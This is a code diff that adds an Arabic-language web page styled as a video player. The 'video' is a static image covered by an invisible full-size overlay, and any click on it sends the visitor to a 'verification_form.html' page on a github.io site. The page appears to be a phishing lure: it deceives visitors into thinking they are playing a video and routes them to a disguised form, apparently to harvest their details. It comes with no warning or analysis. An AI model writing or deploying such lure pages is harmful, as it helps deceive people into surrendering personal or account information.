@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>مشاهدة الفيديو</title>
+    <style>
+        body { margin: 0; padding: 0; background: transparent; }
+        .container {
+            position: relative;
+            width: 600px;
+            height: 400px;
+        }
+        .video-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            cursor: pointer;
+        }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://appsyria00.github.io/ASADALSNA/ALTAL.COM/proxyimage.png" alt="فيديو" class="video-image">
+        <div class="overlay" onclick="redirectToForm()"></div>
+    </div>
+    <script>
+        function redirectToForm() {
+            window.location.href = 'https://appsyria00.github.io/ASADALSNA/ALTAL.COM/ALTAL.COM/verification_form.html';
+        }
+    </script>
+</body>
+
+</html>
+
